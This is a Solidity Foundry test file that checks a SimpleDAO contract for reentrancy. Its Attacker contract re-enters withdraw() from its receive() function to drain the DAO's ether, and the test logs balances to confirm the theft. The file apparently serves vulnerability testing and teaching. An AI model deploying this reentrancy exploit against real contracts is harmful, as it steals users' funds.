// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/simple_dao.sol";

contract ReentrancyTest is Test {
    SimpleDAO public dao;
    Attacker public attacker;
    uint constant DONATION_AMOUNT = 1 ether;
    uint constant WITHDRAW_AMOUNT = 0.5 ether;

    function setUp() public {
        // Create contracts
        dao = new SimpleDAO();
        attacker = new Attacker(dao, WITHDRAW_AMOUNT);
        
        // Fund the test contract so it can make donations
        vm.deal(address(this), DONATION_AMOUNT);
        
        // Donate funds to the attacker's address
        dao.donate{value: DONATION_AMOUNT}(address(attacker));
    }

    function testReentrancyExploit() public {
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 daoBalanceBefore = address(dao).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackerCreditBefore = dao.queryCredit(address(attacker));
        
        console.log("DAO ETH Balance (before):", daoBalanceBefore);
        console.log("Attacker ETH Balance (before):", attackerBalanceBefore);
        console.log("Attacker Credit in DAO (before):", attackerCreditBefore);

        console.log("--- Trigger Attack Operation ---");
        attacker.attack();

        console.log("--- AFTER-Trigger Attack ---");
        uint256 daoBalanceAfter = address(dao).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 attackerCreditAfter = dao.queryCredit(address(attacker));
        
        console.log("DAO ETH Balance (after):", daoBalanceAfter);
        console.log("Attacker ETH Balance (after):", attackerBalanceAfter);
        console.log("Attacker Credit in DAO (after):", attackerCreditAfter);
        
        // Compare state changes to detect vulnerability
        bool isBalanceDrained = (daoBalanceBefore > 0) && (daoBalanceAfter == 0);
        bool isFundsStolen = (attackerBalanceBefore == 0) && 
                             (attackerBalanceAfter == DONATION_AMOUNT);
        bool isCreditExhausted = (attackerCreditBefore == DONATION_AMOUNT) && 
                                 (attackerCreditAfter == 0);
        
        if (isBalanceDrained && isFundsStolen && isCreditExhausted) {
            console.log("Vulnerability Exists: Reentrancy attack successfully altered all critical states");
        } else {
            console.log("Vulnerability not Exist: Key states unchanged after attack");
        }
    }
}

contract Attacker {
    SimpleDAO public dao;
    uint public withdrawAmount;
    uint private reentrancyCount;

    constructor(SimpleDAO _dao, uint _withdrawAmount) {
        dao = _dao;
        withdrawAmount = _withdrawAmount;
    }
    
    function attack() external {
        reentrancyCount = 0;
        dao.withdraw(withdrawAmount);
    }
    
    receive() external payable {
        if (reentrancyCount < 1) {
            reentrancyCount++;
            dao.withdraw(withdrawAmount);
        }
    }
}